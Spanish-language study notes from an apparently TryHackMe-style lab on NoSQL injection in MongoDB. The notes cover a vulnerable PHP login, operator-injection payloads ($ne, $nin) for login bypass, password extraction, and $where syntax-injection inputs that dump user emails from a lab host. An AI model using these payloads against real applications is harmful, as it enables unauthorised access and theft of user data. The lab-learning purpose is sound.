# Introducción

En esta sección, aprenderemos sobre NoSQL Injection. Mientras las bases drelacionadas son populares con guardar datos de la aplicación Web, las bases de datos como MongoDB, son bases de datos noSQL, tienen un riesgo popular en los años recientes.

# Objetivos de aprendizaje

- Entender que es NoSQL
- Entender como funcionan las bases de datos NoSQL, como se guardan los datos.
- Aprender sobre tipos de Injecciones NoSQL
- Aprender como explotar en la práctica injecciones NoSQL

Antes de apredner sobre NoSQL, vamos aver primero como funcionan dichas bases de datos, vamos a centrarnos en MongoDB. 

## MongoDB

Como MySQL, MariaDB, PostgreSQL, MongoDB es otra base de datos donde guardas información ordenada. MongoDB recupera los datos de forma estructurada y rápidamente. 

Podemos pensar que estos documentos son simples estructuras de diccionarios dos los valores claves estan guardados. Son muy parecidos a las bases de datos normales, pero la información se guarda de forma diferente. Por ejemplo, si queremos crear una aplicación web para el departamento HR, y queremos guardar informació simple. Deberemos crear un documento que contenga los datos tal que así

```
{"_id" : ObjectId("5f077332de2cdf808d26cd74"), "username" : "lphillips", "first_name" : "Logan", "last_name" : "Phillips", "age" : "65", "email" : "lphillips@example.com" }
```

![image](https://github.com/user-attachments/assets/4624ba36-7b1c-4cc7-bdc7-3da380fdfa5b)

![image](https://github.com/user-attachments/assets/1667db13-824b-4660-ae4e-187d07ba56d5)

## Consultas en la BD

Como cualquier base de datos, tienen un lenguaje especial para recibir datos o información de la BD. COmo las relacionales usan una variacion de SQL, las bases de datos no relacionadas usan NoSQL. En terminos generales, NoSQL se refiere a las consultas que no son SQL.

Las querys se estructras asociando arryas que contienens groups con criterios y filtrando información Estos filtros son similares 

![image](https://github.com/user-attachments/assets/84bb095c-1b03-4ee9-ba2a-2666cbbe3677)

Si queremos construir un filtro que donde los ultimos libros devuelvan "Sandler"

```
['last_name' => 'Sandler']
```

Si queremos filtrar documentos donde solo es hombre, y el last_name es Philipts

```
['gender' => 'male', 'last_name' => 'Phillips']
```

Si todos los documentos donde la edad es menos que 50

```
['age' => ['$lt'=>'50']]
```

# Injección NoSQL

### Como Injectar NoSQL

```
<?php
$con = new MongoDB\Driver\Manager("mongodb://localhost:27017");


if(isset($_POST) && isset($_POST['user']) && isset($_POST['pass'])){
        $user = $_POST['user'];
        $pass = $_POST['pass'];

        $q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
        $record = $con->executeQuery('myapp.login', $q );
        $record = iterator_to_array($record);

        if(sizeof($record)>0){
                $usr = $record[0];

                session_start();
                $_SESSION['loggedin'] = true;
                $_SESSION['uid'] = $usr->username;

                header('Location: /sekr3tPl4ce.php');
                die();
        }
}
header('Location: /?err=1');

?>
```

La aplicación web hace consultas MongoDB, usando la basededatos "myapp" y la colección "login", consulta cualquier documentos con los filtros de usuario y contraseña, directamente al parametro POST. 

Si de alguna pudieramos cambiar las variables user y pass

```
$user = ['$ne'=>'xxxx'] 

$pass = ['$ne'=>'yyyy']
```

Quedaría a sí

```
['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]
```

Podemos hacer un truco a la base de datos y que nos devuelva cualqueir documentos donde el usaurio sea igual a 'xxxx' y la contraseña no sea igual a 'yyyy'. Esto problablemente devuelta todos los documentos en una colección lógica. Como resultado, la aplicación asume que el login es correcto y la aplicacion corresponde al primer documentos

# Operator Injection: Bypass Login

![image](https://github.com/user-attachments/assets/f73a61ba-d04d-41fa-8f50-221d0434c48c)

La pasamos por el proxy

![image](https://github.com/user-attachments/assets/f3a16914-dbb4-4976-be56-63000b6a77a8)

Procederemos a modificar la consulta

![image](https://github.com/user-attachments/assets/a3c993e3-c39c-4334-8532-9543e1e5ddd6)

# Operator Injection: Logearse con otros usuarios

Usaremos el operador $nin, vamos a modificar nuestro payload.

Primero, el operador debe crear el filtro especificando un criterio donde los documentos estab, no toda la lista de valores. Si queremos logearnos con el usuario eadmin, simplemente lo modificaremos a sí

![image](https://github.com/user-attachments/assets/9103b80f-cb1f-424d-8862-0d9d037e7f31)

```
['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]
```

Le dice a la base de datos que le devuelva cualquier usuario quie no sea admin y la constraseañ que no sea aweasdf. Como resultado nos garantiza que nos meta a otro usuario

![image](https://github.com/user-attachments/assets/cf9a0569-5dd4-42a5-a913-b742dd98a640)

```
['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'aweasdf']]
```

# Operator Injection: Extraer COntraseñas de usuario

En este punto que tsabemos como funcionan las apliacciones.

Primero vamos a coger un usuario ya descubierto y intentar saber la longitud de la contraseña.

![image](https://github.com/user-attachments/assets/6eb95007-884f-42e9-9d20-a4ea0c72edac)

Estamos preguntando a la BD si hat un usuario con el usuario admin y la contraseña tenga 7. Basicamente longitud 7. Si el servidor responde con un error, sabemos que la contraseña del admin no es 7

![image](https://github.com/user-attachments/assets/fb6e09a4-9f4a-444d-b390-cbccc566f704)

Ahora que sabemos que el usuario tiene de longitud 5. Vamos a modificar el PAyload

![image](https://github.com/user-attachments/assets/3dd1edd0-10c7-4b5b-8b72-dceaffbf3135)

Ahora que sabemos como funciona, vamos a ir sacando la contraseña empezando por c.... y nos dara una respuesta de verdad o no y repitiendo usuarios.

![image](https://github.com/user-attachments/assets/42a9b73d-0d83-4dfb-bb5a-a457dc376a16)

# Syntax Injection: Identificacion y Extracción de datos

Ahora que conocemos la injeccion por operador. Vamos a meternos por sh

```
syntax@10.10.159.105's password: 
Please provide the username to receive their email:admin'
Traceback (most recent call last):
  File "/home/syntax/script.py", line 17, in <module>
    for x in mycol.find({"$where": "this.username == '" + username + "'"}):
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1248, in next
    if len(self.__data) or self._refresh():
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1165, in _refresh
    self.__send_message(q)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1053, in __send_message
    operation, self._unpack_response, address=self.__address
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1272, in _run_operation
    retryable=isinstance(operation, message._Query),
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1371, in _retryable_read
    return func(session, server, sock_info, read_pref)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1264, in _cmd
    sock_info, operation, read_preference, self._event_listeners, unpack_res
  File "/usr/local/lib/python3.6/dist-packages/pymongo/server.py", line 134, in run_operation
    _check_command_response(first, sock_info.max_wire_version)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/helpers.py", line 180, in _check_command_response
    raise OperationFailure(errmsg, code, response, max_wire_version)
pymongo.errors.OperationFailure: Failed to call method, full error: {'ok': 0.0, 'errmsg': 'Failed to call method', 'code': 1, 'codeName': 'InternalError'}
Connection to 10.10.159.105 closed.
```

```
for x in mycol.find({"$where": "this.username == '" + username + "'"}):
```

Vemos que la variable usuario esta directamente concatenada con la consulta y la funcion JS se ejecuta y busca el comando, dejando una injección de tipo sintaxys

```
ssh syntax@10.10.159.105
syntax@10.10.159.105's password: 
Please provide the username to receive their email:admin' && 0 && 'x
Connection to 10.10.159.105 closed.

ssh syntax@10.10.159.105
syntax@10.10.159.105's password: 
Please provide the username to receive their email:admin' && 1 && 'x
admin@nosql.int
Connection to 10.10.159.105 closed.
```

## Explotar

```
ssh syntax@10.10.159.105
syntax@10.10.159.105's password: 
Please provide the username to receive their email:admin'||1||'
admin@nosql.int
pcollins@nosql.int
jsmith@nosql.int
[...]
Connection to 10.10.159.105 closed.
```















